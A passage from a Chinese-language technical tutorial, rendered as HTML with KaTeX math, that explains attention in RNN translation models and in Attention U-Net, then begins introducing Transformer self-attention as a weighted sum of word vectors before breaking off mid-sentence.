style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.4638em;vertical-align:-1.4138em;"/><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.05em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"/><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4138em;"><span/></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span/></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span></div>
<p>这里面的<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>q</mi><mrow><mo stretchy="false">(</mo><mi>t</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo></mrow></msub></mrow><annotation encoding="application/x-tex">q_{(t,j)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7858em;vertical-align:-0.3552em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span/></span></span></span></span></span></span></span></span></span>就是比例系数，也可以说是注意力分数，它表示在解码第<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"/><span class="mord mathnormal">t</span></span></span></span></span>个词时，编码器第<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span></span>个输出的重要程度。它是如何得到的呢？通常通过当前解码器的隐藏状态<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">s_{t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>与每一个编码器输出<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>O</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">O_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>进行匹配计算得到，计算方式如上图右边所示，就是将<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">s_{t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>与<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>O</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">O_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>输入到一个可以训练的简单全链接神经网络中去，计算得到匹配分数<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>e</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">e_{t,j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>，然后对所有<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>e</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">e_{t,j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>进行softmax归一化，就可以得到权重<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>q</mi><mrow><mo stretchy="false">(</mo><mi>t</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo></mrow></msub></mrow><annotation encoding="application/x-tex">q_{(t,j)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7858em;vertical-align:-0.3552em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span/></span></span></span></span></span></span></span></span></span></p>
<p>这样一来，模型就能动态地为不同编码器输出分配合适的“注意力”。比如翻译“你”时，它可能给“you”较高的权重，而忽略“How”和"are"。<strong>这个机制本质上是一种可学习的“信息筛选器”</strong>，让解码过程既保持上下文感知，又避免无关噪声的干扰。</p>
<p>再举一个计算机视觉领域的经典例子——<strong>U-Net</strong>。它在图像分割领域几乎家喻户晓，其架构的核心特征是对称的编码器-解码器结构以及贯穿始终的<strong>跳跃连接</strong>（Skip Connections），网络架构图如下所示：</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d406d65c79e94bb2ac9d79d1c442e3a7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=KH6graVHYK1VQjptSqLzVqt2vng%3D" alt="c5.png" width="100%" loading="lazy"/></p>
<p align="center">「图片来源：《U-Net: Convolutional Networks for Biomedical Image Segmentation》」</p>
<p>图中灰色的箭头就是跳跃连接，这些跳跃连接将编码器浅层捕获的、富含细节和空间信息的特征图，直接传递到解码器的对应层，与经过深层抽象的特征进行融合。</p>
<p>其实观察一下，我们不难发现，**真的有必要将早期特征毫无保留地全部传递过去吗？**早期的特征固然包含精确定位所需的细节，但也混杂了大量与分割主题无关的纹理、噪声或背景干扰。全部融合，固然保证了信息的“不丢失”，却也引入了“不纯粹”。</p>
<p>这就催生了 <strong>Attention U-Net</strong> 网络架构。它的解决方案直观而巧妙：在跳跃连接上增设一个<strong>注意力门控</strong>。这个门控机制会自动学习，为传递过来的每一个空间位置的特征计算一个0到1之间的权重。重要的、与当前分割目标相关的特征得以强调（权重接近1），而不相关或冗余的背景信息则被抑制（权重接近0）。这个过程，与前述RNN中的注意力在精神上高度同源，都是<strong>对信息流的主动筛选与加权</strong>。</p>
<p>如果上面的内容你一时没有完全理解，也不用担心——这部分其实已经涉及到 RNN 时期自然语言处理的核心建模思路。了解它们对理解 Transformer 有帮助，但并不是必须的。我主要就是想表达“注意力”这个机制在很久以前就存在了，<strong>“注意力”远非Transformer的专属</strong>，只不过Transformer它彻底抛弃了循环与卷积的固有结构，<strong>将“注意力”推至舞台中央，作为构建模型最核心、甚至是唯一的算子</strong>，并以此为基础，设计了一套简洁、对称且空前强大的架构。接下来，我们就正式进入<strong>Transformer</strong>的世界，看看它是如何彻底抛弃循环结构，完全基于注意力来重构序列建模的。</p>
<hr/>
<p>首先，我们需要明确 Transformer 究竟做了什么。简单来说，它的核心机制是<strong>将一个序列转换为另一个序列</strong>，同时让序列中的每个元素都能“注意到”序列中的其他元素。</p>
<p>让我们来看一个具体的例子。假设我们有三个词的向量表示（词嵌入）：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 原始的三个向量</span>
X =  [[<span class="hljs-number">0.431</span>, <span class="hljs-number">0.313</span>, ..., <span class="hljs-number">0.507</span>],   <span class="hljs-comment"># I 的词向量，记作 x₁</span>
     [<span class="hljs-number">0.396</span>, <span class="hljs-number">0.836</span>, ..., <span class="hljs-number">0.105</span>],   <span class="hljs-comment"># love 的词向量，记作 x₂</span>
     [<span class="hljs-number">0.852</span>, <span class="hljs-number">0.381</span>, ..., <span class="hljs-number">0.541</span>]]   <span class="hljs-comment"># apple 的词向量，记作 x₃</span>

<span class="hljs-comment"># ==== 经过一个 Transformer 层后得到：====</span>

<span class="hljs-comment"># 输出仍然是三个向量，但已融入了上下文信息</span>
Y =  [[<span class="hljs-number">0.624</span>, <span class="hljs-number">0.362</span>, ..., <span class="hljs-number">0.802</span>],   <span class="hljs-comment"># 记作 y₁</span>
     [<span class="hljs-number">0.572</span>, <span class="hljs-number">0.260</span>, ..., <span class="hljs-number">0.249</span>],   <span class="hljs-comment"># 记作 y₂</span>
     [<span class="hljs-number">0.158</span>, <span class="hljs-number">0.458</span>, ..., <span class="hljs-number">0.066</span>]]   <span class="hljs-comment"># 记作 y₃</span>
</code></pre>
<p>经过Transformer层输出的这三个向量都不再仅仅是自身原本的含义，而是<strong>携带了其他词语信息的“语境化”表示</strong>。那么它是如何捕捉其他词语的注意力信息的呢？如果让你来设计，你会如何实现这种“注意力”？</p>
<p>如果让我来设计，要让 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">y_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 包含 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">x_{1},x_{2},x_{3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 的信息，最直接的方式就是对它们进行加权求和：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>y</mi><mn>1</mn></msub><mo>=</mo><msub><mi>q</mi><mn>1</mn></msub><msub><mi>x</mi><mn>1</mn></msub><mo>+</mo><msub><mi>q</mi><mn>2</mn></msub><msub><mi>x</mi><mn>2</mn></msub><mo>+</mo><msub><mi>q</mi><mn>3</mn></msub><msub><mi>x</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">y_{1}=q_{1}x_{1} + q_{2}x_{2} + q_{3}x_{3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span></div>
<p>其中<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>q</mi><mn>1</mn></msub><mo>+</mo><msub><mi>q</mi><mn>2</mn></msub><mo>+</mo><msub><mi>q</mi><mn>3</mn></msub><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">q_1 + q_2 + q_3 = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span>；<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>q</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">q_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 表示 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">x_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 对当前输出 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">y_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 的重要性权重，也就是<strong>注意力得分</strong>。那么现在问题转化为：如何合理地计算这些权重？</p>
<p>在这里我们要回顾一下线性代数中的向量点积运算，比如向量<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>1</mn><mo separator="true">,</mo><mn>3</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(1,3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">3</span><span class="mclose">)</span></span></span></span></span>和向量<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo>−</mo><mn>2</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(-2,1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord">−</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1</span><span class="mclose">)</span></span></span></span></span>进行点积运算，它们的计算结果就是<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math 